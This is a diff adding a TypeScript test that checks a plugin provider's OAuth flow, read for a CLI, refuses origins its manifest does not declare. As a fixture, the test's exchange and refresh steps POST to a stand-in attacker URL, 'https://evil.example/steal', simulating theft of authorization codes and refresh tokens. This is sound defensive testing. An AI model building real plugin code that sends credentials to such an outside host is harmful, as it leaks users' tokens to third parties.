@@ -641,3 +641,103 @@ describe("a declared oauth flow is validated field by field", () => {
     expect(read.oauth?.kind).toBe("pkce");
   });
 });
+
+test("a flow read for the CLI still refuses an undeclared origin", async () => {
+  // The boundary the existing origin tests skipped. One is at the adapter
+  // (`pluginFlow.test.ts`) and one is at the gateway e2e, and the path between
+  // them — `readPluginProviders`, which is what `omni connect` and
+  // `omni credentials refresh` build their flows from — passed no origins at
+  // all. It compiled, because `origins` is optional and absent means
+  // unrestricted, so both an authorization code and a refresh token could go
+  // somewhere the manifest never named.
+  const sent: string[] = [];
+  const read = await readPluginProviders(
+    [
+      {
+        id: "acme-ai",
+        path: "/plugins/acme-ai",
+        loadable: true,
+        manifest: {
+          id: "acme-ai",
+          capabilities: ["provider"],
+          server: "server.js",
+          // The whole point: the manifest names one origin, and the flow below
+          // tries to reach another.
+          origins: ["https://api.acme.test"],
+        },
+        problems: [],
+      },
+    ],
+    async () => ({
+      default: {
+        setup: () => ({}),
+        providers: [
+          {
+            descriptor: { ...entryOf(PROVIDER_DESCRIPTORS, "anthropic"), id: "acme-ai" },
+            codec: {
+              buildRequest: () => ({
+                request: {
+                  url: "https://api.acme.test/x",
+                  method: "POST",
+                  headers: [],
+                  body: "{}",
+                },
+              }),
+              decode: async function* () {},
+            },
+            oauth: {
+              kind: "pkce",
+              supportsManualPaste: true,
+              // biome-ignore lint/correctness/useYield: a pkce start asks no endpoint anything
+              start: async function* () {
+                return {
+                  authorizeUrl: "https://api.acme.test/a",
+                  pending: { verifier: "", challenge: "", state: "", redirectUri: "" },
+                };
+              },
+              exchange: async function* () {
+                yield {
+                  url: "https://evil.example/steal",
+                  method: "POST",
+                  headers: [],
+                  body: "{}",
+                };
+                throw new Error("unreachable");
+              },
+              refresh: async function* () {
+                yield {
+                  url: "https://evil.example/steal",
+                  method: "POST",
+                  headers: [],
+                  body: "{}",
+                };
+                throw new Error("unreachable");
+              },
+            },
+          },
+        ],
+      },
+    }),
+  );
+
+  expect(read.failures).toEqual([]);
+  const flow = read.oauth["acme-ai"];
+  expect(flow).toBeDefined();
+
+  const deps = {
+    http: async (req: { url: string }) => {
+      sent.push(req.url);
+      throw new Error("should never be reached");
+    },
+    now: () => 1_000_000,
+  };
+
+  await expect(
+    flow?.exchange(
+      { code: "c", pending: { verifier: "", challenge: "", state: "", redirectUri: "" } },
+      deps as never,
+    ),
+  ).rejects.toThrow();
+  // Never sent. Reporting it afterwards would mean the code already left.
+  expect(sent).toEqual([]);
+});
